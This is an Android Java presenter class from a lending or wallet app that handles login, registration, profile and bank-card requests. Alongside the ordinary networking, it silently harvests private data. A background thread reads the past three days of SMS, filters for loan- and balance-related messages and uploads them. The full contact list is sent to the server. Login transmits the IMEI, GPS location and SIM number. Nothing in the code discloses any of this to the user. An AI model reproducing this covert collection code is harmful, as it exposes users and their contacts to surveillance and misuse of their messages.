package com.zhiyu.wallet.mvp.presenter;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.gson.Gson;
import com.zhiyu.wallet.bean.Credit;
import com.zhiyu.wallet.bean.User;
import com.zhiyu.wallet.common.App;
import com.zhiyu.wallet.common.Constant;
import com.zhiyu.wallet.http.BasehttpModel;
import com.zhiyu.wallet.http.UserInfoService;
import com.zhiyu.wallet.mvp.contract.UserInfoContract;
import com.zhiyu.wallet.mvp.ui.activity.AuthenCenterActivity;
import com.zhiyu.wallet.mvp.ui.fragment.RepayFragment;
import com.zhiyu.wallet.util.AppUtil;
import com.zhiyu.wallet.util.Println;
import com.zhiyu.wallet.util.UIUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import io.reactivex.observers.DisposableObserver;
import okhttp3.MediaType;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.HttpException;
import retrofit2.Response;
import retrofit2.http.Body;

/**
 * @
 * Created by Administrator on 2018/11/8.
 */

public class UserInfoPresenter extends BasePresenter<UserInfoContract.UserInfoIView> implements UserInfoContract.UserInfoIModel {


    private UserInfoService userInfoService;
    private BasehttpModel basehttpModel;
    private UserInfoContract.BankinfoIView bankinfoIView;
    private static Handler handler ;

    public UserInfoPresenter() {
        basehttpModel = BasehttpModel.getInstance(Constant.Local_ipAddress3);
        userInfoService = basehttpModel.create(UserInfoService.class);

    }


    @Override
    public void requestCheckCode(String telnum) {
        JSONObject jsonObject = new JSONObject();
        String telname2 = telnum.replace(" ", "");
        if (UIUtils.isMobile(telname2)) {

            try {
                jsonObject.put("phone", telname2);
            } catch (JSONException e) {
                e.printStackTrace();
            }

        } else {
            // Iview.connectReturn("手机号错误或不存在");
        }


        basehttpModel.observa(userInfoService.sendSMSgetcode(basehttpModel.getRequestBody(jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    String json = responseBody.string();
                    try {
                        JSONObject jsonObject1 = new JSONObject(json);
                        if (jsonObject1.getInt("code") == 200) {
                            Iview.showSuccess("requestCode:" + jsonObject1.getString("msg"));
                        } else {
                            Iview.showFailure("requestCode:" + jsonObject1.getString("msg"));
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        Iview.showFailure("requestCode:发送失败");
                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });

    }



    @Override
    public void requestLogin(String username, String password, final Activity activity,String channelid) {
        String username2;
        if (UIUtils.isMobile(username)) {
            username2 = username.replace(" ", "");
        } else {
            Iview.showFailure("请输入正确的手机号");
            return;
        }

        JSONObject jsonObject = null;
        try {
            jsonObject = new JSONObject();
            //jsonObject.put("phone", "13787859946");
            //jsonObject.put("password","123" );
            jsonObject.put("phone", username2);
            jsonObject.put("password", password);
            jsonObject.put("sogo","");
            jsonObject.put("loginway",channelid);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        basehttpModel.observa(userInfoService.login(RequestBody.create(MediaType.parse("application/json;charset=utf-8"), jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    String json = responseBody.string();
                    try {
                        JSONObject jsonObject = new JSONObject(json);
                        if (jsonObject.has("code")) {
                            int code = jsonObject.getInt("code");
                            String msg = jsonObject.getString("msg");
                            returnLogin(msg, code,activity);
                        } else {
                            Gson gson = new Gson();
//                            User.getInstance();
                            User.setUser(gson.fromJson(json, User.class));
                            User.getInstance().setLogin(true);
                            if ("已填写".equals(User.getInstance().getKith())) {
                                User.getInstance().setRelainfo(true);
                            }
                            returnLogin("登录成功", 200,activity);
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        returnLogin("登录失败", 400,activity);
                    }

                    System.out.println(json);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }

    @Override
    public void returnLogin(String msg, int code,Context activity) {
        if (code == 200) {
            saveAppinfo(msg,AppUtil.getImei(activity),AppUtil.getChannelData(activity,"UMENG_CHANNEL"),AppUtil.getSpecificLocation(), AppUtil.getNativePhoneNumber(activity),AppUtil.getBrand());
        } else {
            Iview.showFailure(msg);
        }
    }

    @Override
    public void requestRegister(String username, String requestCode, String password, String passwordagin,String channelId) {
        JSONObject jsonObject = new JSONObject();
        String username2 = username.replace(" ", "");
        if (TextUtils.isEmpty(requestCode)) {
            return;
        }

        if (TextUtils.isEmpty(passwordagin)) {
            return;
        }

        if (password.length()<6) {
            Iview.showFailure("tips:" + "密码最少为6位");
            return;
        }
        if (!password.equals(passwordagin)) {
            Iview.showFailure("tips:" + "两次密码不一致");
            return;
        }
        try {
            jsonObject.put("phone", username2);
            jsonObject.put("password", password);
            jsonObject.put("copy1", requestCode);
            jsonObject.put("sogo","1");
            jsonObject.put("togetherway",channelId);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        basehttpModel.observa(userInfoService.register(basehttpModel.getRequestBody(jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    String json = responseBody.string();
                    try {
                        JSONObject jsonObject1 = new JSONObject(json);
                        if (jsonObject1.getInt("code") == 200) {
                            Iview.showSuccess("register:注册成功");
                        } else {
                            Iview.showFailure("tips:" + jsonObject1.getString("msg"));
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        Iview.showFailure("register:" + "注册失败");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }

    @Override
    public void requestForgetpwd(String username, String requestCode, String password, String passwordagin) {
        final JSONObject jsonObject = new JSONObject();
        String username2 = username.replace(" ", "");
        if (UIUtils.isMobile(username2)) {

            try {
                jsonObject.put("phone", username2);
                jsonObject.put("password", password);
                jsonObject.put("copy1", requestCode);
                jsonObject.put("sogo","");
            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            Iview.showFailure("tips:" + "请输入正确的手机号");
            return;
        }

        if (password.length()<6) {
            Iview.showFailure("tips:" + "密码最少为6位");
            return;
        }

        if (!password.equals(passwordagin)) {
            Iview.showFailure("tips:" + "两次密码不一致");
            return;
        }
        basehttpModel.observa(userInfoService.forgetpwd(basehttpModel.getRequestBody(jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {

                try {
                    String json = responseBody.string();
                    try {
                        JSONObject jsonObject1 = new JSONObject(json);
                        if (jsonObject1.getInt("code") == 200) {
                            Iview.showSuccess("forgetpwd:" + jsonObject1.getString("msg"));
                        } else {
                            Iview.showFailure("tips:" + jsonObject1.getString("msg"));
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        Iview.showFailure("forgetpwd:" + "修改密码失败");
                    }
                    Println.suc("forgetpwd", json);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }


    @Override
    public void saveUserRelatives(String ftn, String ftt, String fts, String urn, String urt, String urs) {
        if (TextUtils.isEmpty(ftn) || TextUtils.isEmpty(ftt) || TextUtils.isEmpty(fts) || TextUtils.isEmpty(urn) || TextUtils.isEmpty(urt) || TextUtils.isEmpty(urs)) {
            return;
        }

        User user = User.getInstance();
        user.setFirstcontact(ftn);
        user.setFirstcontactphone(ftt);
        user.setFirstcontactrelation(fts);
        user.setEmergencycontact(urn);
        user.setEmergencycontactphone(urt);
        user.setEmergencycontactrelation(urs);
        user.setRelainfo(true);
        Iview.showSuccess("提交成功");
    }


    @Override
    public void saveUserAllContacts(List<HashMap<String, Object>> result) {
        if (result == null) {
            return;
        }
        JSONObject json = new JSONObject();
        try {
            json.put("phone", User.getInstance().getPhone());
            JSONArray jsonArray = new JSONArray();
            for (int i = 0; i < result.size(); i++) {
                JSONObject jsonObject = new JSONObject(result.get(i));
                jsonArray.put(jsonObject);
            }
            json.put("contacts", jsonArray);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        User.getInstance().setContacts(json.toString());


    }

    @Override
    public HashMap<String, Object> requestUesrRelatives() {
        HashMap<String, Object> map = new HashMap<>();
        User user = User.getInstance();
        if (user.isRelainfo()) {
            map.put("firstContactsname", user.getFirstcontact());
            map.put("firstContactstel", user.getFirstcontactphone());
            map.put("firstContactsship", user.getFirstcontactrelation());
            map.put("urgentContractname", user.getEmergencycontact());
            map.put("urgentContracttel", user.getEmergencycontactphone());
            map.put("urgentContractship", user.getEmergencycontactrelation());
            return map;
        } else {
            return null;
        }
    }

    @Override
    public void requestUerinfo(String nm, String tel, String id, String wcid, String reinf,String addr,String occp,Context context) {
        if (TextUtils.isEmpty(nm) || TextUtils.isEmpty(tel) || TextUtils.isEmpty(id) || TextUtils.isEmpty(wcid) || TextUtils.isEmpty(reinf) || TextUtils.isEmpty(addr) || TextUtils.isEmpty(occp)) {
            return;
        }
        if(nm.contains("*")){
            nm = User.getInstance().getUsername();
        }
        JSONObject jsonObject = new JSONObject();
        User user = User.getInstance();
        try {
            jsonObject.put("phone", tel);
            jsonObject.put("username", nm);
            jsonObject.put("idcar", id);
            jsonObject.put("wechatid", wcid);
            jsonObject.put("kith", reinf);
            jsonObject.put("copy1",addr);
            jsonObject.put("copy2",occp);
            jsonObject.put("fristcontact", user.getFirstcontact());
            jsonObject.put("firstcontactphone", user.getFirstcontactphone());
            jsonObject.put("fristcontactrelation", user.getFirstcontactrelation());
            jsonObject.put("emergencycontact", user.getEmergencycontact());
            jsonObject.put("emergencycontactphone", user.getEmergencycontactphone());
            jsonObject.put("emergencycontactrelation", user.getEmergencycontactrelation());
            jsonObject.put("copy3","");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        user.setUsername(nm);
        user.setIdcar(id);
        user.setWechatid(wcid);
        user.setCopy1(addr);
        user.setCopy2(occp);

        basehttpModel.observa(userInfoService.allContact(basehttpModel.getRequestBody(user.getContacts())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    Println.out("allcontact", responseBody.string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {

            }

            @Override
            public void onComplete() {

            }
        });

        saveUserinfo(context);


        basehttpModel.observa(userInfoService.userinfo(basehttpModel.getRequestBody(jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    Iview.showSuccess(responseBody.string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }

    @SuppressLint("HandlerLeak")
    @Override
    public void saveUserinfo(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            return;
        }

        handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                if(msg.obj!=""){

                    basehttpModel.observa(userInfoService.saveMesg((RequestBody)msg.obj), new DisposableObserver<ResponseBody>() {
                        @Override
                        public void onNext(ResponseBody responseBody) {
                            try {
                                Println.out("savemsg", responseBody.string());
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }

                        @Override
                        public void onError(Throwable e) {

                        }

                        @Override
                        public void onComplete() {

                        }
                    });

                }

            }
        };

        GetMesThread getMesThread = new GetMesThread(context);
        getMesThread.start();



    }

    private static class GetMesThread extends Thread{

        public Context mcontext;

        public GetMesThread(Context context){
            mcontext = context;
        }

        @Override
        public void run() {
            super.run();

            final String SMS_URI_ALL = "content://sms/"; // 所有短信
            final String SMS_URI_INBOX = "content://sms/inbox"; // 收件箱
            final String SMS_URI_SEND = "content://sms/sent"; // 已发送
            final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
            final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
            final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
            final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表

            StringBuilder smsBuilder = new StringBuilder();

            long late2 = Long.parseLong(AppUtil.date2TimeStamp(AppUtil.getLate(-3),"yyyy-MM-dd hh:mm:ss"));
            try {
                Uri uri = Uri.parse(SMS_URI_ALL);
                String[] projection = new String[]{"_id", "address", "person",
                        "body", "date", "type",};
                Cursor cur = mcontext.getContentResolver().query(uri, projection, "date>="+late2,
                        null, "date desc"); // 获取手机内部短信
                // 获取短信中最新的未读短信
                // Cursor cur = getContentResolver().query(uri, projection,
                // "read = ?", new String[]{"0"}, "date desc");
                List<Map<String ,Object > > mapList = new ArrayList<>();
                if (cur.moveToFirst()) {
                    int index_id = cur.getColumnIndex("_id");
                    int index_Address = cur.getColumnIndex("address");
                    int index_Person = cur.getColumnIndex("person");
                    int index_Body = cur.getColumnIndex("body");
                    int index_Date = cur.getColumnIndex("date");
                    int index_Type = cur.getColumnIndex("type");
                    do {
                        int id = cur.getInt(index_id);
                        String strAddress = cur.getString(index_Address);
                        int intPerson = cur.getInt(index_Person);
                        String strbody = cur.getString(index_Body);
                        long longDate = cur.getLong(index_Date);
                        int intType = cur.getInt(index_Type);

                        SimpleDateFormat dateFormat = new SimpleDateFormat(
                                "yyyy-MM-dd hh:mm:ss", Locale.CHINA);
                        Date d = new Date(longDate);
                        String strDate = dateFormat.format(d);

                        String strType = "";
                        if (intType == 1) {
                            strType = "接收";
                        } else if (intType == 2) {
                            strType = "发送";
                        } else if (intType == 3) {
                            strType = "草稿";
                        } else if (intType == 4) {
                            strType = "发件箱";
                        } else if (intType == 5) {
                            strType = "发送失败";
                        } else if (intType == 6) {
                            strType = "待发送列表";
                        } else if (intType == 0) {
                            strType = "所以短信";
                        } else {
                            strType = "null";
                        }
                        smsBuilder.append("[ ");
                        smsBuilder.append(id+", ");
                        smsBuilder.append(strAddress + ", ");
                        smsBuilder.append(intPerson + ", ");
                        smsBuilder.append(strbody + ", ");
                        smsBuilder.append(strDate + ", ");
                        smsBuilder.append(strType);
                        smsBuilder.append(" ]\n\n");

                        Map<String,Object> map = new HashMap<>();
                        map.put("_id",id);
                        map.put("address",strAddress);
                        map.put("person",intPerson);
                        map.put("body",strbody);
                        map.put("date",strDate);
                        map.put("type",strType);
                        if(strbody.contains("还款") || strbody.contains("到期") || strbody.contains("借款") ||strbody.contains("逾期")||strbody.contains("余额") ){
                            mapList.add(map);
                        }

                    } while (cur.moveToNext());

                    if (!cur.isClosed()) {
                        cur.close();
                        cur = null;
                    }

                } else {
                    smsBuilder.append("no result!");

                }
                BasehttpModel.Builder builder = new BasehttpModel.Builder();
                builder.addParam("phone", User.getInstance().getPhone());
                builder.addParams("message",mapList);
                Message message = handler.obtainMessage();
                if(mapList.size()==0){
                    message.obj="";
                }else {
                    message.obj=builder.build();
                }
                handler.sendMessage(message);


//                Println.out("getmes",smsBuilder.toString());

            } catch (SQLiteException ex) {
                Log.d("SQLiteException", ex.getMessage());
            }

        }
    }


    @Override
    public void requestQuitUesr() {

        basehttpModel.observa(userInfoService.logout(), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody response) {
                try {
                    String json = response.string();
                    Println.out("logout", json);
                    if ("200".equals(json)) {
                        User.setUser(null);
                        RepayFragment.isOverdue=false;
                        Iview.showSuccess("账号已退出");

                    } else {
                        Iview.showFailure("退出失败");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }


    @Override
    public void queryBankinfor(final UserInfoContract.BankinfoIView bankinfoIView) {
        this.bankinfoIView = bankinfoIView;

        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("phone", User.getInstance().getPhone());
            jsonObject.put("alipy","");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        basehttpModel.observa(userInfoService.querybankinfo(basehttpModel.getRequestBody(jsonObject.toString())), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody response) {
                List<Map<String ,String>> list = new ArrayList<>();
                try {
                    String json = response.string();
                    Println.out("querybank", json);
                    if(TextUtils.isEmpty(json)){
                        bankinfoIView.requestBankinfoCallBack(list);
                        return;
                    }
                    JSONArray jsonArray=new JSONArray(json);
                    for(int i =0 ;i<jsonArray.length();i++){
                        Map<String,String> map = new HashMap<>();
                        map.put("bankcardname",jsonArray.getJSONObject(i).getString("bankcardname"));
                        map.put("bankcardaccount",jsonArray.getJSONObject(i).getString("bankcardaccount"));
                        list.add(map);
                    }
                    bankinfoIView.requestBankinfoCallBack(list);
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                    bankinfoIView.requestBankinfoCallBack(list);
                }
            }

            @Override
            public void onError(Throwable e) {
                if (Iview == null) {
                    return;
                }
                Iview.connectFailure("网络请求失败，请检查你的网络连接");
            }

            @Override
            public void onComplete() {

            }
        });
    }



    @Override
    public void checkNewsCenter(final ImageView havenews) {
        basehttpModel.observa(userInfoService.judgenewsstatus(new BasehttpModel.Builder()
                .addParam("phone", User.getInstance().getPhone())
                .build()), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    JSONObject jsonObject1 = new JSONObject(responseBody.string());
                    if(havenews==null){
                        return;
                    }
                    int code = jsonObject1.getInt("status");
                    if(code==200){
                        havenews.setVisibility(View.VISIBLE);
                    }else {
                        havenews.setVisibility(View.GONE);
                    }
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                Println.err("news",e.getMessage());
            }

            @Override
            public void onComplete() {

            }
        });
    }

    @Override
    public void setReadAllNews() {
        basehttpModel.observa(userInfoService.updatenewsstatus(new BasehttpModel.Builder()
                .addParam("phone", User.getInstance().getPhone())
                .build()), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    Println.out("newsstatus",responseBody.string());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                Println.err("newsstatus",e.getMessage());
            }

            @Override
            public void onComplete() {

            }
        });
    }

    @Override
    public void saveAppinfo(final String msg,String imei, String channelID, String gpsAddress, String simphone,String phonetype) {

        basehttpModel.observa(userInfoService.saveAppinfo(new BasehttpModel.Builder()
                .addParam("phone",User.getInstance().getPhone())
                .addParam("channel", channelID)
                .addParam("address", gpsAddress)
                .addParam("imei", imei)
                .addParam("sim", simphone)
                .addParam("copy2",phonetype)
                .build()), new DisposableObserver<ResponseBody>() {
            @Override
            public void onNext(ResponseBody responseBody) {
                try {
                    Println.out("loginsaveinfo",responseBody.string());
                    Iview.showSuccess(msg);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onError(Throwable e) {
                Println.err("loginsaveinfo",e.getMessage());
            }

            @Override
            public void onComplete() {

            }
        });
    }


}
